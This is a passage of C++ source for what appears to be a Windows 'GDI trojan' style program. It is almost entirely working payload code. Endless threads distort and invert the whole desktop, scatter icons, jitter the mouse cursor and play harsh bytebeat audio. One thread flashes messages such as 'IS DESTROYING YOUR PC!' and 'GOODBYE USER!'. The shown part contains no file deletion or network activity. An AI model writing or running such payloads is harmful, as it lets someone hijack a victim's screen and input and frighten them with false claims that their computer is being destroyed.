    HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&data, 0, 0);
    SelectObject(mem,bmp);
    int p=0;
    while (true) {
        hdc = GetDC(0);
        p += 5;
        BitBlt(mem,p,0,w,h,hdc,0,0,BLACKNESS);
        for (int i=0; i<w*h; i++) {
            int x = i/w, y = i%w;
            int tempR = GetRValue(data[i].rgb), tempG = GetGValue(data[i].rgb), tempB = GetBValue(data[i].rgb);
            data[i].r = (BYTE)(x | y);
            data[i].g = (BYTE)((x|x) - (y|y));
            data[i].b = (BYTE)((RGB(tempB,tempG,tempR) | RGB(tempB,tempG,tempR)));
            data[rand()%w].rgb = RGB(tempR,tempG,tempB);
        }
        BitBlt(hdc,0,0,w,h,mem,p,0,SRCCOPY);
        BitBlt(hdc,0,0,w,h,mem,p-w+160,0,SRCCOPY);
        BitBlt(hdc,0,0,w,h,mem,p-w-w+160,0,SRCCOPY);
        ReleaseDC(0,hdc);
    }
    return 0;
}

DWORD WINAPI shader7(LPVOID) {
    HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
    int w=W, h=H;
    BITMAPINFO bmi={0}; bmi.bmiHeader.biSize=sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount=32; bmi.bmiHeader.biPlanes=1;
    bmi.bmiHeader.biWidth=w; bmi.bmiHeader.biHeight=h;
    _RGBQUAD* data = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&data, 0, 0);
    SelectObject(mem,bmp);
    int p=0;
    while (true) {
        hdc = GetDC(0);
        p -= 5;
        BitBlt(mem,p,0,w,h,hdc,0,0,SRCCOPY);
        for (int i=0; i<w*h; i++) {
            data[i].r = (BYTE)(i/w);
            data[i].g = (BYTE)(i/w);
            data[i].b = (BYTE)(i%w);
        }
        BitBlt(hdc,0,0,w,h,mem,p,0,SRCCOPY);
        BitBlt(hdc,0,0,w,h,mem,p+w-160,0,SRCCOPY);
        BitBlt(hdc,0,0,w,h,mem,p+w+w-160,0,SRCCOPY);
        ReleaseDC(0,hdc);
        if ((rand()%100+1)%67==0) p=0;
    }
    return 0;
}

#define MELT_FUNC(name, rop) DWORD WINAPI name(LPVOID) { \
    while (true) { \
        HDC hdc=GetDC(0); int w=W, h=H; \
        HBITMAP bmp=CreateCompatibleBitmap(hdc,w,h); \
        HDC temp=CreateCompatibleDC(hdc); \
        SelectObject(temp,bmp); \
        BitBlt(temp,0,0,w,h,hdc,0,0,SRCCOPY); \
        for (int i=0;i<600;i++) { int x=rand()%w, y=rand()%h, dx=(rand()%3)-1, dy=(rand()%3)-1; BitBlt(temp,x+dx,y+dy,w-x,h-y,temp,x,y,SRCCOPY); } \
        BitBlt(hdc,0,0,w,h,temp,0,0,rop); \
        DeleteDC(temp); DeleteObject(bmp); ReleaseDC(0,hdc); Sleep(50); \
    } return 0; }
MELT_FUNC(melt, SRCCOPY)
MELT_FUNC(melt2, SRCINVERT|NOTSRCCOPY)
MELT_FUNC(melt3, SRCAND|SRCINVERT)

DWORD WINAPI transparent2(LPVOID) {
    BLENDFUNCTION blur={AC_SRC_OVER,0,64,0};
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
        HBITMAP bmp=CreateCompatibleBitmap(hdc,w,h);
        SelectObject(mem,bmp);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int i=0;i<5;i++) {
            int x=rand()%w, y=rand()%h;
            HBRUSH br=CreateSolidBrush(RANDC);
            SelectObject(mem,br);
            BitBlt(mem,x,y,128,128,mem,x,y,PATINVERT);
            DeleteObject(br);
        }
        GdiAlphaBlend(hdc,0,0,w,h,mem,0,0,w,h,blur);
        DeleteObject(bmp); DeleteDC(mem);
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

VOID train(HDC hdc,int w,int h,int xp,int yp,DWORD rop) {
    if (xp>=w) xp=w-1; if (yp>=h) yp=h-1;
    HBITMAP ss=CreateCompatibleBitmap(hdc,w,h);
    HDC tmp=CreateCompatibleDC(hdc);
    SelectObject(tmp,ss);
    BitBlt(tmp,0,0,w,h,hdc,0,0,SRCCOPY);
    BitBlt(hdc, xp>0?xp:0, yp>0?yp:0, w-abs(xp), h-abs(yp), hdc, xp<0?-xp:0, yp<0?-yp:0, rop);
    BitBlt(hdc, xp<0?w+xp:0, 0, abs(xp), h, tmp, xp>0?w-xp:0, 0, rop);
    BitBlt(hdc, 0, yp<0?h+yp:0, w, abs(yp), tmp, 0, yp>0?h-yp:0, rop);
    DeleteDC(tmp); DeleteObject(ss);
}

DWORD WINAPI ttrraaiinn(LPVOID) {
    int w=W, h=H;
    while (true) {
        for (int a=0; a<720; a++) {
            int x = (int)(-100*cos(a*M_PI/180)), y = (int)(-100*sin(a*M_PI/180));
            HDC hdc=GetDC(0);
            train(hdc,w,h,x,y,SRCCOPY);
            ReleaseDC(0,hdc);
            Sleep(1);
        }
    }
    return 0;
}

DWORD WINAPI fastmove(LPVOID) {
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
        HBITMAP bmp=CreateCompatibleBitmap(hdc,w,h);
        SelectObject(mem,bmp);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        BitBlt(mem,0,0,w/10*9,h,mem,w/10,0,SRCCOPY);
        BitBlt(mem,w/10*9,0,w/10,h,mem,0,0,SRCCOPY);
        BitBlt(hdc,0,0,w,h,mem,0,0,SRCCOPY);
        DeleteObject(bmp); DeleteDC(mem);
        ReleaseDC(0,hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI anything(LPVOID) {
    int w=W, h=H;
    while (true) {
        HDC hdc=GetDC(0);
        POINT pt[8]; for (int i=0;i<8;i++){ pt[i].x=rand()%w; pt[i].y=rand()%h; }
        BYTE types[3]={PT_MOVETO,PT_LINETO,PT_BEZIERTO};
        INT ints[7]={2,3,4,5,6,7,8};
        DWORD dwords[7]={2,3,4,5,6,7,8};
        HPEN pen=CreatePen(PS_SOLID,rand()%9,RANDC);
        HBRUSH br=CreateSolidBrush(RANDC);
        SelectObject(hdc,pen); SelectObject(hdc,br);
        switch (rand()%16) {
            case 0: AngleArc(hdc,rand()%w,rand()%h,rand()%((w+h)/2),rand()%360,rand()%360); break;
            case 1: Arc(hdc,rand()%w,rand()%h,rand()%w,rand()%h,rand()%w,rand()%h,rand()%w,rand()%h); break;
            case 2: ArcTo(hdc,rand()%w,rand()%h,rand()%w,rand()%h,rand()%w,rand()%h,rand()%w,rand()%h); break;
            case 3: Chord(hdc,rand()%w,rand()%h,rand()%w,rand()%h,rand()%w,rand()%h,rand()%w,rand()%h); break;
            case 4: Ellipse(hdc,rand()%w,rand()%h,rand()%w,rand()%h); break;
            case 5: LineTo(hdc,rand()%w,rand()%h); break;
            case 6: Pie(hdc,rand()%w,rand()%h,rand()%w,rand()%h,rand()%w,rand()%h,rand()%w,rand()%h); break;
            case 7: PolyBezier(hdc,pt,rand()%8); break;
            case 8: PolyBezierTo(hdc,pt,rand()%8); break;
            case 9: PolyDraw(hdc,pt,types,rand()%8); break;
            case 10: Polygon(hdc,pt,rand()%8); break;
            case 11: Polyline(hdc,pt,rand()%8); break;
            case 12: PolylineTo(hdc,pt,rand()%8); break;
            case 13: PolyPolygon(hdc,pt,ints,rand()%8); break;
            case 14: PolyPolyline(hdc,pt,dwords,rand()%8); break;
            case 15: Rectangle(hdc,rand()%w,rand()%h,rand()%w,rand()%h); break;
        }
        DeleteObject(pen); DeleteObject(br);
        ReleaseDC(0,hdc);
        Sleep(50);
    }
    return 0;
}

DWORD WINAPI drawmikuicon(LPVOID) {
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0);
        DrawIconEx(hdc,rand()%w,rand()%h,LoadIcon(GetModuleHandle(0),MAKEINTRESOURCE(3+rand()%13)),128,128,0,0,DI_NORMAL);
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI anyblt(LPVOID) {
    int w=W, h=H;
    while (true) {
        HDC hdc=GetDC(0);
        DWORD rop[12]={SRCCOPY,SRCPAINT,SRCAND,SRCINVERT,SRCERASE,NOTSRCCOPY,NOTSRCERASE,MERGECOPY,MERGEPAINT,PATPAINT,PATINVERT,DSTINVERT};
        HBRUSH br=CreateSolidBrush(RANDC); SelectObject(hdc,br);
        StretchBlt(hdc,rand()%w,rand()%h,rand()%w,rand()%h,hdc,rand()%w,rand()%h,rand()%w,rand()%h,rop[rand()%12]);
        DeleteObject(br);
        ReleaseDC(0,hdc);
        Sleep(50);
    }
    return 0;
}

DWORD WINAPI anyblt2(LPVOID) {
    int w=W, h=H;
    while (true) {
        HDC hdc=GetDC(0);
        POINT pt[3]; for (int i=0;i<3;i++){ pt[i].x=rand()%w; pt[i].y=rand()%h; }
        PlgBlt(hdc,pt,hdc,rand()%w,rand()%h,rand()%w,rand()%h,0,0,0);
        ReleaseDC(0,hdc);
        Sleep(50);
    }
    return 0;
}

DWORD WINAPI fastdown(LPVOID) {
    int w=W, h=H;
    while (true) {
        int rx=rand()%w, rw=rand()%w/4;
        HDC hdc=GetDC(0);
        StretchBlt(hdc,rx,rand()%20,rw,h,hdc,rx,0,rw,h,SRCCOPY);
        ReleaseDC(0,hdc);
        rx=rand()%w; rw=rand()%w/4;
        hdc=GetDC(0);
        HBRUSH br=CreateSolidBrush(RANDC); SelectObject(hdc,br);
        StretchBlt(hdc,rx,rand()%20,rw,h,hdc,rx,0,rw,h,(DWORD)0x1900ac010e);
        DeleteObject(br);
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI text3(LPVOID) {
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
        int a = (w>h)? rand()%(h/10) : rand()%(w/10);
        HBITMAP bmp=CreateCompatibleBitmap(hdc,w,h);
        SelectObject(mem,bmp);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        LPCSTR txt[5]={"hexacbngdfgjgsffgh.exe IS DESTROYING YOUR PC!","R.I.P YOUR PC!","","THIS IS THE END!","GOODBYE USER!"};
        int tmp=4-rand()%5;
        SetBkColor(mem,RGB(255-rand()%256,255-rand()%256,255-rand()%256));
        SetTextColor(mem,RGB(255-rand()%256,255-rand()%256,255-rand()%256));
        HFONT font=CreateFont(a,a/2,0,0,900-rand()%901,0,0,0,ANSI_CHARSET,OUT_CHARACTER_PRECIS,CLIP_CHARACTER_PRECIS,4-rand()%5,(rand()%5<<4),"114514");
        SelectObject(mem,font);
        TextOutA(mem,w-rand()%w,h-rand()%h,txt[tmp],strlen(txt[tmp]));
        BitBlt(hdc,0,0,w,h,mem,0,0,SRCCOPY);
        DeleteObject(font); DeleteObject(bmp); DeleteDC(mem);
        ReleaseDC(0,hdc);
        Sleep(5);
    }
    return 0;
}

DWORD WINAPI crushscr(LPVOID) {
    int get=1, mod=1;
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
        HBITMAP bmp=CreateCompatibleBitmap(hdc,w,h);
        SelectObject(mem,bmp);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int y=0;y<h;y++) {
            int shift = (rand()%2) ? -get : get;
            StretchBlt(mem,shift,y,w,1,mem,0,y,w,1,SRCCOPY);
        }
        HDC mem2=CreateCompatibleDC(hdc);
        HBITMAP bmp2=CreateCompatibleBitmap(hdc,w,h);
        SelectObject(mem2,bmp2);
        BitBlt(mem2,0,0,w,h,mem,0,0,SRCCOPY);
        for (int x=0;x<w;x++) {
            int shift = (rand()%2) ? -get : get;
            StretchBlt(mem2,x,shift,1,h,mem2,x,0,1,h,SRCCOPY);
        }
        BitBlt(hdc,0,0,w,h,mem2,0,0,SRCCOPY);
        DeleteObject(bmp); DeleteObject(bmp2); DeleteDC(mem); DeleteDC(mem2);
        ReleaseDC(0,hdc);
        if (get>40) mod=2; else if (get==1 && mod==2) mod=1;
        get += (mod==1)?1:-1;
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI ColorInvert(LPVOID) {
    while (true) {
        HDC hdc=GetDC(0);
        BitBlt(hdc,0,0,W,H,hdc,0,0,NOTSRCCOPY);
        ReleaseDC(0,hdc);
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI cosinescreen(LPVOID) {
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0);
        int a=1+rand()%64, b=1+rand()%64;
        for (int y=0; y<=h; y+=10) {
            HBRUSH br=CreateSolidBrush(RANDC); SelectObject(hdc,br);
            StretchBlt(hdc, (int)(-a*cos((float)b*y)), y, w, 10, hdc, 0, y, w, 10, MERGECOPY);
            DeleteObject(br);
        }
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI cosinescreen2(LPVOID) {
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0);
        int a=1+rand()%64, b=1+rand()%64;
        for (int x=0; x<=w; x+=10)
            StretchBlt(hdc, x, (int)(-a*cos((float)b*x)), 10, h, hdc, x, 0, 10, h, MERGECOPY);
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI pixel10proxl(LPVOID) {
    int clr[4]={57,74,37,0};
    while (true) {
        int a=rand()%4;
        HDC hdc=GetDC(0);
        SetPixel(hdc,rand()%W,rand()%H,RGB(clr[a],clr[a],clr[a]));
        ReleaseDC(0,hdc);
    }
    return 0;
}

DWORD WINAPI text4(LPVOID) {
    int clr[6]={255,255,128,128,192,255}, clg[6]={0,128,0,64,0,64}, clb[6]={0,128,0,64,0,64};
    LPCWSTR txt=L"01";
    while (true) {
        int a=rand()%6;
        HDC hdc=GetDC(0);
        SetTextColor(hdc,RGB(clr[a],clg[a],clb[a]));
        SetBkMode(hdc,1);
        TextOutW(hdc, rand()%W, rand()%H, txt, wcslen(txt));
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI profect(LPVOID) {
    int w=W, h=H;
    while (true) {
        HDC hdc=GetDC(0);
        BitBlt(hdc,0,0,w,h,hdc,-w/10,0,SRCCOPY);
        BitBlt(hdc,0,0,w,h,hdc,w/10*9,0,SRCCOPY);
        BitBlt(hdc,0,0,w,h,hdc,0,-h/10,SRCCOPY);
        BitBlt(hdc,0,0,w,h,hdc,0,h/10*9,SRCCOPY);
        HBRUSH br=CreateSolidBrush(RANDC); SelectObject(hdc,br);
        BitBlt(hdc,0,0,w,h,hdc,0,0,PATINVERT);
        DeleteObject(br);
        ReleaseDC(0,hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI shader8(LPVOID) {
    HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
    int w=W, h=H;
    BITMAPINFO bmi={0}; bmi.bmiHeader.biSize=sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount=32; bmi.bmiHeader.biPlanes=1;
    bmi.bmiHeader.biWidth=w; bmi.bmiHeader.biHeight=h;
    _RGBQUAD* data = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&data, 0, 0);
    SelectObject(mem,bmp);
    while (true) {
        hdc = GetDC(0);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int i=0; i<w*h; i++) {
            int x=i%w, y=i/w;
            COLORREF c = Hue(256);
            data[i].rgb = (x == y) ? RGB(GetRValue(c), GetGValue(c), GetBValue(c)) : 0;
        }
        BitBlt(hdc,0,0,w,h,mem,0,0,SRCCOPY);
        ReleaseDC(0,hdc);
    }
    return 0;
}

DWORD WINAPI drawmikucur(LPVOID) {
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0);
        DrawIconEx(hdc,rand()%w,rand()%h,LoadCursor(GetModuleHandle(0),MAKEINTRESOURCE(1+rand()%15)),64,64,0,0,DI_NORMAL);
        DrawIconEx(hdc,rand()%w,rand()%h,LoadCursor(GetModuleHandle(0),MAKEINTRESOURCE(1+rand()%15)),64,64,0,0,DI_NORMAL);
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI shader9(LPVOID) {
    HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
    int w=W, h=H;
    BITMAPINFO bmi={0}; bmi.bmiHeader.biSize=sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount=32; bmi.bmiHeader.biPlanes=1;
    bmi.bmiHeader.biWidth=w; bmi.bmiHeader.biHeight=h;
    _RGBQUAD* data = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&data, 0, 0);
    SelectObject(mem,bmp);
    while (true) {
        hdc = GetDC(0);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int i=0; i<w*h; i++) {
            int x=i%w, y=i/w;
            COLORREF c = Hue(256);
            data[i].rgb = (x >> y) ? RGB(GetRValue(c), GetGValue(c), GetBValue(c)) : 0;
        }
        BitBlt(hdc,0,0,w,h,mem,0,0,SRCCOPY);
        ReleaseDC(0,hdc);
    }
    return 0;
}

DWORD WINAPI mousemikucur(LPVOID) {
    POINT pt;
    while (true) {
        HDC hdc = GetDC(0);
        GetCursorPos(&pt);
        DrawIcon(hdc, pt.x, pt.y, LoadCursor(NULL, IDC_CROSS));
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI movemouse(LPVOID) {
    POINT pt;
    while (true) {
        GetCursorPos(&pt);
        SetCursorPos(pt.x + 1 - rand()%3, pt.y + 1 - rand()%3);
        Sleep(10);
    }
    return 0;
}

// ===== BYTEBEATS =====

VOID WINAPI sound1() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,24000,24000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[24000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( (t >> ((t & 16383) ? 3 : 5)) & t * ((t >> 5) & (t >> 7)) | t * ((t >> 4) | ((t >> 6) & (t >> 9))) & 36 | (2 >> (t & 29)) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound2() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[8000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( ((int)((t % 55500 < 2400) ? t * 8.976 : (t % 55500 < 5000) ? t * 8.976 : (t % 55500 < 7500) ? t * 10.08 : (t % 55500 < 10000) ? t * 8.976 : (t % 55500 < 12500) ? t * 8.976 : (t % 55500 < 15000) ? t * 10.08 : (t % 55500 < 18000) ? t * 8.976 : (t % 55500 < 21000) ? t * 7 : (t % 55500 < 24000) ? t * 7.552 : (t % 55500 < 27000) ? t * 7.728 : (t % 55500 < 28500) ? t * 5.992 : (t % 55500 < 30000) ? t * 6.728 : (t % 55500 < 31500) ? t * 5.992 : (t % 55500 < 33000) ? t * 6.728 : (t % 55500 < 34500) ? t * 5.992 : (t % 55500 < 36000) ? t * 6.728 : (t % 55500 < 40000) ? t * 5.992 : (t % 55500 < 41500) ? t * 6.552 : (t % 55500 < 43000) ? t * 8 : (t % 55500 < 44500) ? t * 7.552 : (t % 55500 < 46000) ? t * 6 : (t % 55500 < 48500) ? t * 7.552 : (t % 55500 < 51000) ? t * 6.728 : (t % 55500 < 55500) ? t * 5.992 : 1)) ^ (t & 254) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound3() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[8000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( (t >> 7 | t >> ((t >> 15) & 30)) + (t >> 8 & t) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound4() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,10240,10240,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[10240*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( ( ((int)((t % 114000 < 3000) ? t * 5.992 : (t % 114000 < 6000) ? t * 5.992 : (t % 114000 < 9000) ? t * 5.992 : (t % 114000 < 11000) ? t * 5.656 : (t % 114000 < 13000) ? t * 5.04 : (t % 114000 < 19000) ? t * 5.656 : (t % 114000 < 23000) ? t * 6.728 : (t % 114000 < 25000) ? t * 4.488 : (t % 114000 < 27000) ? t * 5.04 : (t % 114000 < 29000) ? t * 5.656 : (t % 114000 < 33000) ? t * 5.656 : (t % 114000 < 37000) ? t * 5.656 : (t % 114000 < 40000) ? t * 5.656 : (t % 114000 < 42000) ? t * 5.04 : (t % 114000 < 44000) ? t * 4.488 : (t % 114000 < 49000) ? t * 4.24 : (t % 114000 < 51000) ? t * 3.36 : (t % 114000 < 55000) ? t * 3.36 : (t % 114000 < 57000) ? t * 3 : (t % 114000 < 61000) ? t * 2.832 : (t % 114000 < 64000) ? t * 5.992 : (t % 114000 < 67000) ? t * 5.992 : (t % 114000 < 70000) ? t * 5.992 : (t % 114000 < 72000) ? t * 5.656 : (t % 114000 < 74000) ? t * 5.04 : (t % 114000 < 80000) ? t * 5.656 : (t % 114000 < 84000) ? t * 6.728 : (t % 114000 < 86000) ? t * 4.488 : (t % 114000 < 88000) ? t * 5.04 : (t % 114000 < 90000) ? t * 5.656 : (t % 114000 < 94000) ? t * 5.656 : (t % 114000 < 98000) ? t * 5.656 : (t % 114000 < 101000) ? t * 5.656 : (t % 114000 < 103000) ? t * 5.04 : (t % 114000 < 105000) ? t * 4.488 : (t % 114000 < 114000) ? t * 4.24 : 0)) - t & (t >> 7) >> (t & 31) ^ t ) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound5() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,10000,10000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[10000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( ( ((int)((t % 128000 < 2000) ? t * 4.488 : (t % 128000 < 4000) ? t * 5.656 : (t % 128000 < 6000) ? t * 6.728 : (t % 128000 < 10000) ? t * 7.552 : (t % 128000 < 14000) ? t * 4.488 : (t % 128000 < 18000) ? t * 6.728 : (t % 128000 < 22000) ? t * 4.488 : (t % 128000 < (22000 + (4000 / 3) * 2)) ? t * 4.24 : (t % 128000 < (22000 + (4000 / 3) * 6)) ? t * 6.728 : (t % 128000 < 32000) ? t * 5.656 : (t % 128000 < 34000) ? t * 4.488 : (t % 128000 < 36000) ? t * 5.656 : (t % 128000 < 38000) ? t * 6.728 : (t % 128000 < 42000) ? t * 8.552 : (t % 128000 < 46000) ? t * 4.488 : (t % 128000 < 50000) ? t * 7.728 : (t % 128000 < 54000) ? t * 4.488 : (t % 128000 < (54000 + (4000 / 3) * 2)) ? t * 4.24 : (t % 128000 < (54000 + (4000 / 3) * 4)) ? t * 6.728 : (t % 128000 < 64000) ? t * 5.656 : (t % 128000 < 66000) ? t * 8.976 : (t % 128000 < 68000) ? t * 10.08 : (t % 128000 < 70000) ? t * 11.312 : (t % 128000 < 74000) ? t * 22.624 : (t % 128000 < 78000) ? t * 13.456 : (t % 128000 < 82000) ? t * 20.184 : (t % 128000 < 86000) ? t * 13.456 : (t % 128000 < (86000 + (4000 / 3) * 2)) ? t * 11.312 : (t % 128000 < (86000 + (4000 / 3) * 4)) ? t * 17.96 : (t % 128000 < 96000) ? t * 13.456 : (t % 128000 < 98000) ? t * 4.488 : (t % 128000 < 100000) ? t * 5.656 : (t % 128000 < 102000) ? t * 6.728 : (t % 128000 < 106000) ? t * 7.552 : (t % 128000 < 110000) ? t * 4.488 : (t % 128000 < 114000) ? t * 7.729 : (t % 128000 < 118000) ? t * 4.488 : (t % 128000 < (118000 + (4000 / 3) * 2)) ? t * 4.232 : (t % 128000 < (118000 + (4000 / 3) * 4)) ? t * 5.04 : (t % 128000 < 128000) ? t * 4.488 : 0)) - t & (t >> 8) ) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound6() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,32768,32768,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[32768*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( t * (t >> 6 | t >> ((t >> 11) & 31)) / 65536 );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound7() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,32768,32768,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[32768*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( (t >> 6 | t >> ((t >> 11) & 31)) + 8 );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound8() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,11025,11025,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[11025*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( ( ((int)((t % 114000 < 3000) ? t * 5.992 : (t % 114000 < 6000) ? t * 5.992 : (t % 114000 < 9000) ? t * 5.992 : (t % 114000 < 11000) ? t * 5.656 : (t % 114000 < 13000) ? t * 5.04 : (t % 114000 < 19000) ? t * 5.656 : (t % 114000 < 23000) ? t * 6.728 : (t % 114000 < 25000) ? t * 4.488 : (t % 114000 < 27000) ? t * 5.04 : (t % 114000 < 29000) ? t * 5.656 : (t % 114000 < 33000) ? t * 5.656 : (t % 114000 < 37000) ? t * 5.656 : (t % 114000 < 40000) ? t * 5.656 : (t % 114000 < 42000) ? t * 5.04 : (t % 114000 < 44000) ? t * 4.488 : (t % 114000 < 49000) ? t * 4.24 : (t % 114000 < 51000) ? t * 3.36 : (t % 114000 < 55000) ? t * 3.36 : (t % 114000 < 57000) ? t * 3 : (t % 114000 < 61000) ? t * 2.832 : (t % 114000 < 64000) ? t * 5.992 : (t % 114000 < 67000) ? t * 5.992 : (t % 114000 < 70000) ? t * 5.992 : (t % 114000 < 72000) ? t * 5.656 : (t % 114000 < 74000) ? t * 5.04 : (t % 114000 < 80000) ? t * 5.656 : (t % 114000 < 84000) ? t * 6.728 : (t % 114000 < 86000) ? t * 4.488 : (t % 114000 < 88000) ? t * 5.04 : (t % 114000 < 90000) ? t * 5.656 : (t % 114000 < 94000) ? t * 5.656 : (t % 114000 < 98000) ? t * 5.656 : (t % 114000 < 101000) ? t * 5.656 : (t % 114000 < 103000) ? t * 5.04 : (t % 114000 < 105000) ? t * 4.488 : (t % 114000 < 114000) ? t * 4.24 : 0)) | t ^ (t >> (t & 31)) ) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound9() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,8192,8192,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[8192*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
